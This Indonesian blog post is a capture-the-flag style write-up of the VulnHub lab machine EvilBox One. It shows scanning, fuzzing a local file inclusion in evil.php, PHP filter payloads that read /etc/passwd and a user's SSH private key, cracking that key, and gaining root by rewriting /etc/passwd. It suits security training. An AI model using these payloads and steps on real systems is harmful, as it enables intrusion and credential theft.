---
title: "Writeup Machine EvilBox One VulnHub"
author: Ibnu Ubaeydillah
layout: post
comments: true
permalink: /Writeup-Machine-EvilBox-One-VulnHub/
tags: [writeup, all-post]
---
Selamat pagi, ini adalah writeup ketiga saya, yang saya buat. pada tulisan kali ini akan berjudul ``Writeup Machine EvilBox One VulnHub``, untuk mesinnya sendiri saya dapat dari [vulhub.com]('https://vulnhub.com'), bagi temen-temen yang ingin mencobanya juga silakan bisa download disini ya [EvilBox One](https://www.vulnhub.com/entry/evilbox-one,736/). 
<h2>Scan Open Ports</h2>
Yang pertama biasa saya lakukan adalah melakukan scanning port, untuk melihat port apa saja yang terbuka pada sistem.
```
sudo nmap -sV -sC -vv evilbox.thm
```
<br><center><img src="https://user-images.githubusercontent.com/28418984/184517553-57a9a662-d696-464c-b26a-5ea61eb9f573.png"></center>
<h2>Enumerate Webserver</h2>
disini saya melakukan proses bruteforce direktori pada sistem dan menemukan direktori ``/secret`` kemungkinan ini adalah kunci untuk masuk ke shell.

```
gobuster dir -r -u http://evilbox.thm/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

```
<br><center>
<img src="https://user-images.githubusercontent.com/28418984/184518826-be098476-4860-4869-b495-2d589045289a.png">
</center>

lalu saya kembali melanjutkan enumerate dan menemukan lagi informasi yang baru di dalam direktori ``/secret/`` ternyata ada file ``evil.php``.
```
gobuster dir -r -u http://evilbox.thm/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
<br>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184518960-25bab359-1c86-4972-bfbc-1ec7f9a70b26.png">
</center>
<h2>Get vulnerability</h2>
saya melanjutkan dengan teknik bruteforce tetapi menggunakan ``FUZZ``
```
ffuf -c -r -u 'http://evilbox.thm/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0
```
<br>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184519090-1fe06f97-af5f-487b-9cb0-dd86c29e6ee8.png">
</center>
tenyata terdapat vulnerability pada halaman ``http://evilbox.thm/secret/evil.php`` yaitu berupa ``LFI`` untuk memastikannya bahwa memang benar bug ``LFI`` disini saya mencoba ``curl``.
```
curl 'evilbox.thm/secret/evil.php?command=/etc/passwd'
```
<br>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184519253-bfb13042-5479-43f7-8db4-1cb9675d8ac9.png">
</center>
<h2>Get Shell</h2>
Lalu saya mencoba melakukan teknik yang bernama ``PHP Wrapper``, digunakan untuk melihat source code dari file ``evil.php`` dengan memasukan perintah berikut.
```
curl 'evilbox.thm/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php'
```
kemudian saya decode base64 tersebut dan ternyata isinya adalah 
```
<?php
    $filename = $_GET['command'];
    include($filename);
?>
```
karena disini bisa menggunakan teknik ``PHP Wrapper`` saya coba untuk melihat file ``/etc/passwd``
```
curl 'evilbox.thm/secret/evil.php?command=php://filter/convert.base64-encode/resource=/etc/passwd'
```
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184537167-ccec2e9e-2341-4535-bd34-48f21bbc8f73.png">
</center>
setelah saya decode base64 tersebut isinya seperti ini.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```
Disini say fokus pada user ``mowree`` dan mencoba untuk melihat ``id_rsa``nya apakah ada atau tidak, saya memasukan perintah berikut ini.
```
curl 'evilbox.thm/secret/evil.php?command=php://filter/convert.base64-encode/resource=/home/mowree/.ssh/id_rsa'
```
lalu saya decode lagi base64 tersebut dan isinya seperti ini, ternyata di encode ``id_rsa``nya.
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```
kemudian saya simpan ``mowree`` tersebut tetapi sebelumnya chmod terlebih dahulu dengan printah ``chmod 600 mowree`` dan nantinya saya akan menggunakan ``ssh2john`` untuk membuka encode tersebut dengan perintah.

```
ssh2john mowree | tee hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
<br>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184537491-3fc8c34f-79a7-4b7b-8c0e-86788640fb82.png">
</center>
jadi password dari user ``mowree` adalah ``unicorn``, kemudian saya mencoba untuk login kedalam ssh.
``ssh -i mowree mowree@evilbox.thm`` ternyata berhasil passwordnya benar.
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184537694-98f7f01f-a609-4609-8242-ac376a882da9.png">
</center>
<h2>Get User Root</h2>
setelah berhasil masuk ke shell, saya langsung mendownload [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) untuk menganalisa ``Privilege Linux`` ini. ternyata pada direktori ``/etc/passwd`` bisa kita ``write``.
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184537900-06c7af8c-d938-4694-901c-d23e386afc74.png">
</center>
kemudian saya jalankan perintah ``openssl passwd -1`` dan masukan kalimat ``root``, sebenernya bebas ini mau dimasukan kata sandi apa saja. setelah memasukan kata sandinya maka akan menghasilkan ``hash`` nah hash inilah yang nantinya akan digunakan untuk mengganti tulisan ``x`` pada user ``root``.

```
pada tulisan ini ada tulisan x
root:x:0:0:root:/root:/bin/bash
tulisan x ini diganti menjadi
root:$1$zlwVtUdZ$GstF6vF3FKN.50qeaU9LO/:0:0:root:/root:/bin/bash
```
<br>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184538154-43392f76-4ba4-4d9c-af33-dafcaeb65003.png">
</center>
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184538274-94b3203e-8fcc-430b-bc38-a171f564cadb.png">
</center>
sekarang masukan perintah ``sudo -l root`` dan masukan password ``root``, tadaaa sekarang berhasil menjadi user ``root``
<center>
	<img src="https://user-images.githubusercontent.com/28418984/184538378-d77431f1-2eed-45e7-9ee1-83157cdab8db.png">
</center>
Cukup sekian pada writeup ketiga kali ini, semoga bermanfaat. Terima kasih.